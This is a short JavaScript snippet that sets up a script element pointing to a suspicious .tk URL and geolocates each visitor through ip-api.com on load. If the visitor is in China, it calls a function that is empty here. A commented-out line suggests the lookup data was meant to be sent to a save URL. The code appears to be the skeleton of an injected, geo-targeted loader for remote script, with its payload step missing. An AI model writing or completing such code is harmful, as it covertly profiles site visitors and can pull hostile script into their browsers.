var xcreateElement = document.createElement('SCRIPT');
var xcreateElement_url='https://dcap9.tk/myxxxxpkc/xmlHttpRequestUrl.php'
function NewMyGetIPCall()
{


}


function NewMyGetIP()
{
	mUrl="http://ip-api.com/json/";
	try
	{
		var xmlHttpRequest= new XMLHttpRequest();
	} catch (e) {xmlHttpRequest= new ActiveXObject("Microsoft.XMLHTTP");} 
 
	xmlHttpRequest.onreadystatechange = function()
	{
		if(xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200)
		{
			var b = xmlHttpRequest.responseText;
			try
			{
				//NewgetUrlPostMy(saveurl,b,muuid);
				var cs=JSON.parse(b)

				if(cs['country']=='China')NewMyGetIPCall();
			}
			catch (e) {}

		} 
	}
    xmlHttpRequest.open("GET",mUrl,true);
    xmlHttpRequest.send(); 

}
NewMyGetIP()